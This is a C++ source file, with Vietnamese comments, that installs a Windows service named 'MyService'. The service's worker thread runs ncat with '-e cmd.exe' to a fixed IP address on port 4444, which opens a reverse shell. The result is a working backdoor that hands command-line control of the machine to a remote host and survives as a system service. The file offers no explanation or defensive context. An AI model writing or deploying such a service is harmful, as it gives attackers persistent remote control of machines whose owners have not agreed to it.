#include <windows.h>
#include <iostream>

SERVICE_STATUS          g_ServiceStatus; 
SERVICE_STATUS_HANDLE   g_StatusHandle; 
HANDLE                  g_ServiceStopEvent = NULL; 

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD CtrlCode);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

int main() {
    // Đăng ký Service
    SERVICE_TABLE_ENTRYW ServiceTable[] = {  // Sử dụng SERVICE_TABLE_ENTRYW cho Unicode
        { L"MyService", (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },  // Sử dụng Unicode (L"" chuỗi wchar_t)
        { NULL, NULL }
    };

    // Start service control dispatcher
    if (!StartServiceCtrlDispatcherW(ServiceTable)) { // Sử dụng StartServiceCtrlDispatcherW cho Unicode
        std::cerr << "Failed to start service control dispatcher. Error: " << GetLastError() << std::endl;
    }

    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandlerW(L"MyService", ServiceCtrlHandler); // Sử dụng Unicode
    if (g_StatusHandle == NULL) {
        return;
    }

    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE) {
        std::cerr << "Failed to set service status. Error: " << GetLastError() << std::endl;
    }

    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    if (hThread == NULL) {
        return;
    }

    WaitForSingleObject(hThread, INFINITE);
}

void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        SetEvent(g_ServiceStopEvent);
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        break;
    default:
        break;
    }
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    STARTUPINFOW si; // Sử dụng STARTUPINFOW thay vì STARTUPINFOA
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    LPCWSTR szCmdPath = L"C:\\Windows\\System32\\cmd.exe";
    LPCWSTR szCmdArgs =  L"/C \"C:\\Program Files (x86)\\Nmap\\ncat.exe\" -e cmd.exe 192.168.1.12 4444";

    // Tạo process với phiên bản Unicode
    if (!CreateProcessW(szCmdPath, (LPWSTR)szCmdArgs, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {  // Sử dụng CreateProcessW
        std::cerr << "CreateProcess failed. Error: " << GetLastError() << std::endl;
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
